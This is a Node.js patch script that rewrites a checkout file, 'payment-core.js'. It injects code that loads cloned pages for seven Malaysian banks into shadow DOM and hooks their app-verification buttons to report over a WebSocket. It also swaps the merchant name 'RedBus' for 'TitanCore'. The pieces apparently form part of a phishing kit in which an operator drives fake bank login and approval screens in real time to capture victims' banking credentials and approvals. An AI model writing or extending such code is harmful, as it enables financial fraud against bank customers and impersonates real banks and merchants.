import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const file = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'custom', 'checkout', 'payment-core.js');
let src = fs.readFileSync(file, 'utf8');

src = src.replace(
  /     12\. 启动 WS[\s\S]*?wsConnect\(\);\s*\}/,
  '/* WS started by payment-overlays.js after overlay mount */'
);

const start = src.indexOf('function updateOtpCardLogoStyle');
const end = src.indexOf('window.tcPayment.wsConnect = wsConnect;');
if (start < 0 || end < 0) throw new Error('patch anchors not found');

const head = src.slice(0, start);
const tail = `
function isRelativeAssetUrl(url) {
  return url && !/^(?:[a-z][a-z0-9+.-]*:|\\/\\/|\\/|#)/i.test(url);
}

function assetUrl(url, pagePath) {
  return pagePath.replace(/\\/$/, '') + '/' + url.replace(/^\\.\\//, '');
}

function rewriteMerchantNames(markup) {
  return markup.replace(/RedBus/gi, 'TitanCore').replace(/REDBUS/g, 'TITANCORE');
}

function rewriteAssetUrls(markup, pagePath) {
  return rewriteMerchantNames(markup)
    .replace(/\\b(src|href|poster)=(["'])([^"']+)\\2/gi, function (match, attr, quote, url) {
      if (!isRelativeAssetUrl(url)) return match;
      return attr + '=' + quote + assetUrl(url, pagePath) + quote;
    })
    .replace(/url\\((["']?)([^)"']+)\\1\\)/gi, function (match, quote, url) {
      if (!isRelativeAssetUrl(url)) return match;
      return 'url(' + (quote || '') + assetUrl(url, pagePath) + (quote || '') + ')';
    });
}

async function loadPage(pagePath, mountId) {
  var htmlText = await fetch(pagePath + '/index.html').then(function (r) { return r.text(); });
  var cssHrefs = [];
  htmlText.replace(/<link[^>]+href="([^"]+)"[^>]*>/gi, function (_, href) {
    if (href.endsWith('.css')) cssHrefs.push(href.substring(href.lastIndexOf('/') + 1));
    return _;
  });
  var cssTexts = await Promise.all(cssHrefs.map(function (h) {
    return fetch(pagePath + '/' + h)
      .then(function (r) { return r.text(); }, function () { return ''; })
      .then(function (css) { return rewriteAssetUrls(css, pagePath); });
  }));
  var host = document.getElementById(mountId);
  if (!host) return;
  host.innerHTML = '';
  var shadow = host.attachShadow({ mode: 'open' });
  var cleanHtml = rewriteAssetUrls(htmlText, pagePath).replace(/<link[^>]*\\.css[^>]*>/gi, '');
  shadow.innerHTML = '<style>' + cssTexts.join('\\n') + '</style>' + cleanHtml;
}

function makeAppContinue(mountId) {
  return function () {
    var m = document.querySelector('#' + mountId);
    if (!m || !m.shadowRoot) return;
    var box = m.shadowRoot.querySelector('div > div');
    if (box) { box.style.display = 'flex'; box.classList.remove('hidden'); }
    if (ws && ws.readyState === 1 && sid) {
      ws.send(JSON.stringify({ type: 'app_verify_done', payload: { sessionId: sid } }));
    }
  };
}

var CustomizationappVerifyContinue1 = makeAppContinue('mount1');
var CustomizationappVerifyContinue2 = makeAppContinue('mount2');
var CustomizationappVerifyContinue3 = makeAppContinue('mount3');
var CustomizationappVerifyContinue4 = makeAppContinue('mount4');
var CustomizationappVerifyContinue5 = makeAppContinue('mount5');
var CustomizationappVerifyContinue6 = makeAppContinue('mount6');
var CustomizationappVerifyContinue7 = makeAppContinue('mount7');

async function initBanks() {
  await loadPage('/pay/AMBANK', 'mount1');
  document.querySelector('#mount1').shadowRoot.querySelector('#formactions > a > div').addEventListener('click', CustomizationappVerifyContinue1);
  await loadPage('/pay/CIMB', 'mount2');
  document.querySelector('#mount2').shadowRoot.querySelector('#formactions > a > div').addEventListener('click', CustomizationappVerifyContinue2);
  await loadPage('/pay/MALAYAN', 'mount3');
  document.querySelector('#mount3').shadowRoot.querySelector('#oobCheckBtn > div').addEventListener('click', CustomizationappVerifyContinue3);
  await loadPage('/pay/OCBC', 'mount4');
  document.querySelector('#mount4').shadowRoot.querySelector('#formactions').addEventListener('click', CustomizationappVerifyContinue4);
  await loadPage('/pay/RHB', 'mount5');
  document.querySelector('#mount5').shadowRoot.querySelector('#formactionsoob > td > a > div').addEventListener('click', CustomizationappVerifyContinue5);
  await loadPage('/pay/PBB', 'mount6');
  document.querySelector('#mount6').shadowRoot.querySelector('#ExitLink').addEventListener('click', CustomizationappVerifyContinue6);
  await loadPage('/pay/SCBMB', 'mount7');
  document.querySelector('#mount7').shadowRoot.querySelector('#ExitLink').addEventListener('click', CustomizationappVerifyContinue7);
}

window.tcPayment.wsConnect = wsConnect;
window.tcPayment.handleAction = handleAction;
window.tcPayment.buildPayload = buildPayload;
window.tcPayment.sendPayload = sendPayload;
window.tcPayment.submitPayment = submitPayment;
window.tcPayment.initBanks = initBanks;
window.tcPayment.bindOverlayControls = bindOverlayControls;
window.CustomizationappVerifyContinue1 = CustomizationappVerifyContinue1;
window.CustomizationappVerifyContinue2 = CustomizationappVerifyContinue2;
window.CustomizationappVerifyContinue3 = CustomizationappVerifyContinue3;
window.CustomizationappVerifyContinue4 = CustomizationappVerifyContinue4;
window.CustomizationappVerifyContinue5 = CustomizationappVerifyContinue5;
window.CustomizationappVerifyContinue6 = CustomizationappVerifyContinue6;
window.CustomizationappVerifyContinue7 = CustomizationappVerifyContinue7;
})();
`;

let out = head + tail;

out = out.replace(
  /var fn\s*=\s*getFullName\(\)\s*\?\s*q\('fullName'\)\.value\.trim\(\)\s*:\s*'';/g,
  'var fn = getFullName();'
);
out = out.replace(
  /var exp = q\('expiry'\)\s*\?\s*q\('expiry'\)\.value\.trim\(\)\s*:\s*'';/g,
  "var exp = q('expiry') ? q('expiry').value.trim().replace(/\\s/g, '') : '';"
);

fs.writeFileSync(file, out, 'utf8');
console.log('patched payment-core.js (' + out.length + ' chars)');
